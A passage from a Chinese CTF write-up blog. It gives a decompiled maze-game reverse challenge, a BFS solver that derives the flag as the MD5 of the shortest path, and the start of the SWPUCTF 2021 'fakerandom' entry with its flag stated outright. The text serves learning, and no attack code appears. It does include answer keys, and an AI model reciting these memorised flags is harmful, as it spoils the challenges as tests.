<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'Mice walk in a maze: wasd to move,q to quit'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"flag is the shortest path's md5,example:if the shortest path is wasdsdw,the flag is md5('wasdsdw')"</span>)</span><br><span class="line">i, j = (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> i == row * <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> j == col * <span class="number">2</span> - <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'ohhhh!!!!you did it'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'your position:({},{})'</span>.<span class="built_in">format</span>(i, j))</span><br><span class="line">        inp = msvcrt.getch()</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">        ti, tj = i, j</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b'a'</span> == inp <span class="keyword">and</span> i &gt; <span class="number">0</span>:</span><br><span class="line">            tj -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b'w'</span> == inp <span class="keyword">and</span> j &gt; <span class="number">0</span>:</span><br><span class="line">                ti -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b's'</span> == inp <span class="keyword">and</span> j &lt; row * <span class="number">2</span>:</span><br><span class="line">                    ti += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">b'd'</span> == inp <span class="keyword">and</span> i &lt; col * <span class="number">2</span>:</span><br><span class="line">                        tj += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> <span class="string">b'q'</span> == inp:</span><br><span class="line">                            exit(<span class="string">'bye!!'</span>)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">'What???'</span>)</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> maze[ti][tj] == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(random.choice([<span class="string">'no wayy!!'</span>, <span class="string">"it's wall"</span>, <span class="string">'nop'</span>]))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> maze[ti][tj] == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(random.choice([<span class="string">'nice!!'</span>, <span class="string">'yeah!!'</span>, <span class="string">'Go on'</span>]))</span><br><span class="line">        i, j = ti, tj</span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义迷宫</span></span><br><span class="line">maze = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义移动方向及其对应的字符</span></span><br><span class="line">directions = [(-<span class="number">1</span>, <span class="number">0</span>, <span class="string">'w'</span>), (<span class="number">1</span>, <span class="number">0</span>, <span class="string">'s'</span>), (<span class="number">0</span>, -<span class="number">1</span>, <span class="string">'a'</span>), (<span class="number">0</span>, <span class="number">1</span>, <span class="string">'d'</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_shortest_path</span>():</span><br><span class="line">    <span class="comment"># 起点 (0,1) 和终点 (24,23)</span></span><br><span class="line">    start = (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    end = (<span class="number">24</span>, <span class="number">23</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用BFS搜索最短路径</span></span><br><span class="line">    queue = deque()</span><br><span class="line">    queue.append((start[<span class="number">0</span>], start[<span class="number">1</span>], <span class="string">""</span>))</span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line">    visited.add((start[<span class="number">0</span>], start[<span class="number">1</span>]))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        x, y, path = queue.popleft()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查是否到达终点</span></span><br><span class="line">        <span class="keyword">if</span> x == end[<span class="number">0</span>] <span class="keyword">and</span> y == end[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 尝试四个方向</span></span><br><span class="line">        <span class="keyword">for</span> dx, dy, d <span class="keyword">in</span> directions:</span><br><span class="line">            nx, ny = x + dx, y + dy</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 检查边界和墙壁</span></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= nx &lt; <span class="number">25</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= ny &lt; <span class="number">25</span> <span class="keyword">and</span> maze[nx][ny] == <span class="number">0</span> <span class="keyword">and</span> (nx, ny) <span class="keyword">not</span> <span class="keyword">in</span> visited:</span><br><span class="line">                visited.add((nx, ny))</span><br><span class="line">                queue.append((nx, ny, path + d))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找最短路径</span></span><br><span class="line">shortest_path = find_shortest_path()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"最短路径:"</span>, shortest_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算flag (路径的MD5)</span></span><br><span class="line">flag = hashlib.md5(shortest_path.encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"flag:"</span>, flag)</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="17-SWPUCTF-2021-新生赛-fakerandom"><a href="#17-SWPUCTF-2021-新生赛-fakerandom" class="headerlink" title="17 [SWPUCTF 2021 新生赛]fakerandom"></a>17 [SWPUCTF 2021 新生赛]fakerandom</h2><p>🚩flag：<code>NSSCTF{FakeE_random}</code></p><p>💡hint：<code>Python</code> <code>XOR</code> <code>语言逆向</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="string">'xxxxxxxxxxxxxxxxxxxx'</span></span><br><span class="line">random.seed(<span class="number">1</span>)</span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    l.append(random.getrandbits(<span class="number">8</span>))</span><br><span class="line">result=[]</span><br><span class="line"><span class="keyword">for</span> i <span 